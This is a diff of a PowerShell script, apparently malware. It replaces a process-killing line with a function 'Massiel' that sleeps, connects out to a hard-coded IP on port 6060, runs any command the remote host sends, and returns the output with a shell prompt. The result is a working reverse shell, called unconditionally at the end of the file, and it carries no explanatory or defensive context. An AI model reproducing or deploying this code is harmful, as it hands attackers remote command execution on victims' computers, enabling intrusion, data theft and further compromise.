@@ -1,4 +1,80 @@
 Function Massiel {
-    Get-Process powershell -ErrorAction SilentlyContinue | Stop-Process -Force
+
+        Try {
+
+            Start-Sleep -Seconds 60
+
+            $Hosts = '152.0.11.57'
+			
+            $Port = 6060
+
+            $Clients = New-Object System.Net.Sockets.TcpClient($Hosts, $Port)
+            $Clients.NoDelay = $true
+
+            $Streams = $Clients.GetStream()
+
+            [byte[]]$Datos = [byte[]]::new(65536)
+
+            $Bodas = [System.Text.Encoding]::UTF8.GetBytes('Ready')
+
+            $Streams.Write($Bodas,0,$Bodas.Length)
+
+            While (($Saints = $Streams.Read($Datos, 0, $Datos.Length)) -ne 0){
+
+                $Commands = [System.Text.Encoding]::UTF8.GetString($Datos, 0, $Saints)
+
+                $ErrorActionPreference = 'Stop'
+
+                Try {
+
+                    $ScriptBlocks = [ScriptBlock]::Create($Commands)
+
+                    $Results = & $ScriptBlocks 2>&1 | Out-String
+
+                }
+                Catch {
+
+                    $Results = $_.Exception.Message
+
+                }
+
+                if([String]::IsNullOrWhiteSpace($Results)){
+
+                    $Results = "[OK]"
+
+                }
+
+                $Sends = $Results + "`r`nPS " + (pwd).Path + "> "
+
+                $SendData = [System.Text.Encoding]::UTF8.GetBytes($Sends)
+
+                $Streams.Write($SendData,0,$SendData.Length)
+
+                $Streams.Flush()
+
+            }
+
+        }
+        Catch {
+
+            Start-Sleep -Seconds 9
+
+            Write-Host "Conexion Terminate"
+
+        }
+        Finally {
+
+            if($Streams){
+               $Streams.Close()
+            }
+
+            if($Clients){
+               $Clients.Close()
+
+        }
+
+    }
+
 }
+
 Massiel
